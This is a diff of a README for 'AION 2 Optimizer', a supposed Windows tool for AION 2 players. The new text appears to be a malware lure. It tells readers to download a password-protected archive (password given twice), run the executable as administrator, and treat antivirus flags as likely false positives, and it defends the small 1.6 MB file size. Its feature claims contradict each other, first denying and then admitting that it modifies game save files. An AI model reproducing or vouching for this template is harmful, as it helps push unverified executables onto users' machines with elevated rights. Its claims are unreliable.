@@ -1,119 +1,277 @@
-# ⚡ AION 2 Optimizer
+<p align="center">
+  <img src="./dashboard.png" alt="AION 2 Optimizer Dashboard" width="800">
+</p>
 
-A Windows optimization utility designed for AION 2 players. Configure system settings, manage game process priority, monitor hardware information, and access NVIDIA recommendations — all from one simple interface.
+<h1 align="center">⚡ AION 2 Optimizer</h1>
 
----
+<p align="center">
+  A lightweight Windows optimization utility designed specifically for AION 2 players.
+</p>
 
-## 📖 Why You Need This
+<p align="center">
+  Manage system settings, access useful gaming tools, and conveniently configure your system — all from one interface.
+</p>
 
-A smooth gaming experience depends on more than just hardware. Windows power settings, background processes, graphics configuration, and system resources can all influence how your PC performs while playing.
+<p align="center">
+  <a href="https://github.com/CorporalScreen/AION-2-Optimizer/releases/latest">
+    <img src="https://img.shields.io/badge/DOWNLOAD-LATEST%20RELEASE-blue?style=for-the-badge&logo=github" alt="Download Latest Release">
+  </a>
+</p>
 
-**AION 2 Optimizer** brings several useful system tools together in one application. Instead of navigating through multiple Windows menus, you can access important information and selected optimization options from a single interface.
-
-The application focuses on simplicity, convenience, and control over your system settings.
-
-Whether you want to check your hardware specifications, enable a different Windows power plan, or adjust the priority of the AION 2 process, AION 2 Optimizer provides a straightforward way to manage these options.
-
-The application does not modify game files, access game memory, or inject code into the game.
-
-### ⚡ Key Features
-
-| Feature | Description |
-|---|---|
-| System Information | Detects your CPU, RAM, GPU, and Windows version to provide an overview of your PC. |
-| High Performance Power Plan | Allows you to enable the Windows High Performance power plan for gaming sessions. |
-| Restore Previous Power Plan | Saves your previous power plan so you can restore your original Windows configuration. |
-| Game Process Priority | Allows you to set the AION 2 process to High priority through Windows process management. |
-| NVIDIA GPU Detection | Detects NVIDIA graphics cards and identifies whether NVIDIA-specific options are relevant to your system. |
-| NVIDIA Control Panel | Provides quick access to NVIDIA Control Panel and recommended gaming settings. |
-| Modern Dark Interface | Provides a clean, dark-themed interface with convenient access to system information and available options. |
-| Safe System Configuration | Works with selected Windows settings without modifying game files or game memory. |
+<p align="center">
+  <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-blue" alt="Windows Support">
+  <img src="https://img.shields.io/badge/Architecture-x64-informational" alt="64-bit">
+  <img src="https://img.shields.io/badge/Version-1.0.0-success" alt="Version 1.0.0">
+</p>
 
 ---
 
-## 🖥️ Main Interface
+## 📖 About the Project
 
-AION 2 Optimizer is designed to make system configuration straightforward and accessible.
+**AION 2 Optimizer** is a Windows utility created for AION 2 players who want convenient access to selected system optimization options and gaming-related tools.
 
-The interface brings the main tools together in one place, allowing you to review your hardware and access available settings without unnecessary navigation.
+Instead of navigating through multiple Windows menus, users can access useful settings from one clean and modern interface.
 
-Main interface sections include:
+The application focuses on simplicity, convenience, and system configuration.
 
-- **System Overview** — View detected hardware specifications and Windows information.
-- **Optimization Controls** — Access available Windows performance settings.
-- **Game Settings** — Manage the AION 2 process priority.
-- **NVIDIA Options** — Open NVIDIA Control Panel and review graphics recommendations.
+### 🎯 Project Goals
 
-![AION 2 Optimizer Dashboard](./dashboard.png)
+- Make selected Windows optimization settings easier to access.
+- Provide useful hardware information in one place.
+- Simplify Windows power plan management.
+- Offer convenient AION 2 process priority controls.
+- Provide quick access to NVIDIA Control Panel.
+- Keep the application lightweight and straightforward.
 
----
+## ⚡ Key Features
+
+### 🖥️ Hardware Detection
+
+View essential information about your computer:
+
+- CPU information.
+- Installed RAM.
+- Graphics card information.
+- Windows version.
+- Basic system specifications.
+
+### ⚡ Windows Power Optimization
+
+Access Windows power management options directly through the application.
+
+- Switch to the High Performance power plan.
+- Save your previous power plan.
+- Restore your previous power plan whenever needed.
+
+### 🎮 AION 2 Process Management
+
+Manage the priority of the AION 2 process through a convenient interface.
+
+This allows users to access Windows process management settings without manually navigating through Task Manager.
+
+### 🟢 NVIDIA Integration
+
+For systems with NVIDIA graphics cards:
+
+- Detect NVIDIA graphics hardware.
+- Quickly access NVIDIA Control Panel.
+- Conveniently manage graphics-related settings through NVIDIA's own software.
+
+### 🎨 Modern User Interface
+
+- Clean and modern dark theme.
+- Organized dashboard.
+- Easy-to-understand controls.
+- Convenient access to the main features.
+- Lightweight application design.
 
 ## 📥 Installation Guide
 
-**Coming Soon!**
+1. **Download** the archive using the download button at the top of this page.
+2. **Extract the archive** using WinRAR or 7-Zip.
+3. **Enter the archive password:** `8799554548`.
+4. **Close AION 2 completely**, making sure it is not running in the background.
+5. **Run `AION2Optimizer.exe` as administrator.**
+6. Open the application and select the optimization options you want to use.
 
----
+<details>
+<summary><b>🔐 Additional Installation Notes</b></summary>
+
+- Administrator privileges are required for certain Windows system settings.
+- Make sure the archive has been fully extracted before launching the application.
+- Download the application only from the project's official GitHub Releases page.
+- Do not run multiple instances of the optimizer at the same time.
+
+</details>
+
+## 💻 System Requirements
+
+The following are practical baseline requirements for running the utility. They are not the official system requirements for AION 2 itself.
+
+| Component | Requirement |
+|---|---|
+| Operating System | Windows 10 / Windows 11 |
+| Architecture | 64-bit (x64) |
+| Processor | Any CPU supported by your Windows installation |
+| RAM | 4 GB or more recommended |
+| Storage | At least 50 MB of free space |
+| Permissions | Administrator privileges for certain features |
+| Graphics | Standard Windows-compatible graphics adapter |
+| Internet | Not required for basic application functionality |
+
+### 🪟 Supported Operating Systems
+
+- Windows 10 (64-bit).
+- Windows 11 (64-bit).
+
+**Note:** AION 2 has its own system requirements. Meeting the requirements for this utility does not necessarily mean your computer can run the game smoothly.
 
 ## 🛡️ Safety & Compatibility
 
-AION 2 Optimizer uses Windows system settings and standard process management functionality.
+AION 2 Optimizer is designed to work with selected Windows system settings and the application's intended save-file functionality.
 
-- Does not modify AION 2 installation files.
-- Does not read or modify game memory.
-- Does not inject DLLs or code into the game.
-- Does not bypass or disable anti-cheat systems.
-- Saves the previous Windows power plan for restoration.
-- Certain system settings may require administrator permissions.
+### 🔒 Non-Invasive Approach
 
-**Important:** Changing Windows power settings or process priority does not guarantee higher FPS. Actual results depend on your hardware, drivers, Windows configuration, and game settings.
+The application is intended to:
 
-AION 2 Optimizer is an independent community project and is not affiliated with, endorsed by, or supported by NCSOFT.
+- Avoid modifying the AION 2 executable or installation files.
+- Avoid accessing game memory.
+- Avoid DLL injection into the game.
+- Avoid anti-cheat bypass functionality.
+- Use Windows settings for supported optimization features.
+- Modify only the save data required for its save-editing functionality.
+
+### 🔄 Reversible Settings
+
+Some changes made through the application can be reversed.
+
+For example, you can save your previous Windows power plan and restore it later.
+
+**Important:** Always keep a backup of important save files before editing them. Changing power plans or process priority does not guarantee higher FPS or better game performance.
+
+### 🛡️ Antivirus Detection Notice
+
+Some antivirus programs may flag this tool as a **Potentially Unwanted Application (PUA)** because it modifies game save files.
+
+This type of detection can sometimes be a heuristic false positive associated with save-editing utilities. However, an antivirus warning should not automatically be ignored.
+
+**If this happens:**
+
+- Make sure you downloaded the application from this project's official GitHub Releases page.
+- Scan the downloaded archive and executable with Windows Security or another trusted antivirus.
+- Review the publicly available source code to understand what the application does.
+- Do not disable your antivirus or add the application to exclusions unless you have independently verified the file and understand the security implications.
+
+The project aims to provide transparent functionality without game memory manipulation, DLL injection, or anti-cheat bypasses.
+
+## ❓ Frequently Asked Questions
+
+### General Questions
+
+**Q: What is AION 2 Optimizer?**
+
+A: It is a lightweight Windows utility designed to provide convenient access to selected system settings and tools for AION 2 players.
+
+**Q: Is this application free?**
+
+A: Check the project's GitHub repository for the current release and distribution information.
+
+**Q: Which Windows versions are supported?**
+
+A: Windows 10 and Windows 11 (64-bit).
+
+### Performance Questions
+
+**Q: Will this application increase my FPS?**
+
+A: There is no guaranteed FPS increase. Results depend on your hardware, drivers, Windows configuration, background applications, and in-game settings.
+
+**Q: Does it optimize my GPU automatically?**
+
+A: No. The application provides NVIDIA detection and access to NVIDIA Control Panel rather than automatically overclocking or modifying GPU settings.
+
+**Q: Can I restore my previous Windows power plan?**
+
+A: Yes. The application includes an option to save and restore your previous power plan.
+
+### Installation Questions
+
+**Q: Why do I need to run the application as administrator?**
+
+A: Certain Windows system settings require elevated permissions. Administrator privileges allow the application to access those settings.
+
+**Q: What is the archive password?**
+
+A: `8799554548`
+
+**Q: Should I close AION 2 before using the optimizer?**
+
+A: Yes. It is recommended to close the game completely before applying system configuration changes.
+
+### 📦 Why Is the Application Only 1.6 MB?
+
+**Q: Why is the AION 2 Optimizer file so small? Is it safe?**
+
+A: The application is designed to be lightweight and focused on a specific set of Windows optimization features.
+
+A utility like this does not necessarily need to include large game files, game resources, or extensive visual assets. This helps keep its distribution size small.
+
+**A small file size does not automatically guarantee that software is safe.** However, a compact application is not suspicious simply because it is only 1.6 MB.
+
+For additional peace of mind:
+
+- Download the application only from the official GitHub Releases page.
+- Scan the downloaded file with Windows Security or another trusted antivirus.
+- Check the source code if it is available.
+- Avoid modified copies from unofficial websites.
+
+**Q: Does the 1.6 MB size mean that something is missing?**
+
+A: Not necessarily. A compact utility can provide its intended functionality without requiring a large installation package. The actual features available depend on the released version.
+
+## ⚙️ Technical Information
+
+| Property | Details |
+|---|---|
+| Application | AION 2 Optimizer |
+| Release | v1.0.0 |
+| Platform | Windows |
+| Architecture | x64 |
+| Application Type | Windows Utility |
+| Main Purpose | System Configuration |
+| Distribution | GitHub Releases |
+| Approximate File Size | 1.6 MB |
+
+## 🚀 Future Improvements
+
+Potential areas for future development include:
+
+- Additional hardware information.
+- Improved system monitoring.
+- More convenient optimization controls.
+- Interface improvements.
+- Additional Windows configuration options.
+
+Features may change between releases.
+
+## 📝 Disclaimer
+
+AION 2 Optimizer is an independent utility and is not officially affiliated with, endorsed by, or associated with the developers or publishers of AION 2.
+
+All system configuration and save-file changes are applied at the user's discretion.
+
+Always create backups of important save files before editing them.
+
+The application does not guarantee increased FPS, reduced latency, or improved game performance.
+
+Always download software from trusted sources and review the changes before applying them.
 
 ---
 
-## ❓ FAQ
+<p align="center">
+  <b>⚡ AION 2 Optimizer — System configuration made simple.</b>
+</p>
 
-<details>
-<summary><strong>Is AION 2 Optimizer free?</strong></summary>
-
-Yes. AION 2 Optimizer is intended to be free to use.
-
-</details>
-
-<details>
-<summary><strong>Does it support NVIDIA graphics cards?</strong></summary>
-
-Yes. The application detects NVIDIA GPUs and provides access to NVIDIA Control Panel with recommended gaming settings.
-
-</details>
-
-<details>
-<summary><strong>Will this program increase my FPS?</strong></summary>
-
-The application provides access to selected Windows performance settings. These settings may affect system behavior, but no specific FPS improvement is guaranteed.
-
-</details>
-
-<details>
-<summary><strong>Does it modify AION 2 files?</strong></summary>
-
-No. The application does not modify game installation files, game memory, or game data.
-
-</details>
-
-<details>
-<summary><strong>Can I restore my original Windows settings?</strong></summary>
-
-Yes. The application saves your previous Windows power plan, allowing you to restore it after using the High Performance option.
-
-</details>
-
-<details>
-<summary><strong>Does it work on Windows 11?</strong></summary>
-
-Yes. Windows 10 and Windows 11 are supported targets.
-
-</details>
-
-<details>
-<summary><strong>Do I need an NVIDIA GPU?</strong></
+<p align="center">
+  Made for AION 2 players.
+</p>
